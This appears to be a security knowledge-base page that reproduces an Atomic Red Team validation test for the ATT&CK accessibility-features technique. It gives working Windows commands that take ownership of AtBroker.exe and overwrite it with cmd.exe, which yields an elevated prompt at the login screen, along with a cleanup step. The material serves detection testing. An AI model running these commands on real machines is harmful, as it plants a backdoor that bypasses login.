---
atomic_guid: "210be7ea-d841-40ec-b3e1-ff610bb62744"
title: "Replace AtBroker.exe (App Switcher binary) with cmd.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "210be7ea-d841-40ec-b3e1-ff610bb62744"
  - "Replace AtBroker.exe (App Switcher binary) with cmd.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Replace AtBroker.exe (App Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt from the login screen by locking and then unlocking the computer after toggling on any of the accessibility tools in the Accessibility menu.

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution#^t1546008-accessibility-features|T1546.008: Accessibility Features]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\AtBroker.exe /A
icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe
```

### Cleanup

```cmd
copy /Y C:\Windows\System32\AtBroker_backup.exe C:\Windows\System32\AtBroker.exe
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
